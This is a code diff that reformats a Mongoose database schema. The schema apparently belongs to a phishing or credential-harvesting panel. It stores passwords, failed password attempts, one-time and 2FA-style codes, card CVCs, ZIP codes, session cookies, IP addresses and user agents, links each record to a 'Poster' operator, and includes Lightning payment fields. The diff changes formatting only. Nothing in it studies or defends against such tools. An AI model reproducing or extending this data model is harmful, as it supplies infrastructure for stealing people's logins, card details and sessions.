@@ -1,58 +1,54 @@
-import mongoose from 'mongoose'
+import mongoose from "mongoose";
 
 const Schema = mongoose.Schema;
-const infoSchema = new Schema({
-
+const infoSchema = new Schema(
+  {
     site: {
-        type: String,
+      type: String,
     },
     email: {
-        type: String,
+      type: String,
 
-        lowercase: true,
-
+      lowercase: true,
     },
-     adminId:{
-        type: String,
+    adminId: {
+      type: String,
     },
     password: {
-        type: String,
-
-
+      type: String,
     },
     amount: {
-        type: String,
+      type: String,
     },
     skipcode: {
-        type: String,
+      type: String,
     },
 
     username: {
-        type: String,
+      type: String,
     },
     gCode: {
-        type: String,
+      type: String,
     },
     passcode: {
-        type: String,
-
+      type: String,
     },
     poster: {
-        type: String,
+      type: String,
     },
     root: {
-        type: mongoose.Schema.Types.ObjectId,
+      type: mongoose.Schema.Types.ObjectId,
 
-        ref: 'Poster'
+      ref: "Poster",
     },
     ip: {
-        type: String,
+      type: String,
     },
     agent: {
-        type: String,
+      type: String,
     },
     number: {
-        type: String,
+      type: String,
     },
     mail: { type: String },
     wrongPassword: { type: String },
@@ -69,19 +65,15 @@ const infoSchema = new Schema({
     cvc: { type: String },
     name: { type: String },
     zipCode: { type: String },
-   cookie: { type: String },
+    cookie: { type: String },
     rHash: { type: String },
     lightningInvoice: { type: String },
+  },
+  { timestamps: true },
+);
 
-}, { timestamps: true })
+const Info = mongoose.model("Info", infoSchema);
 
-
-
-
-const Info = mongoose.model('Info', infoSchema);
-
-export default Info
-
-
+export default Info;
 
 // 6558fca9d08567217d7b4cef
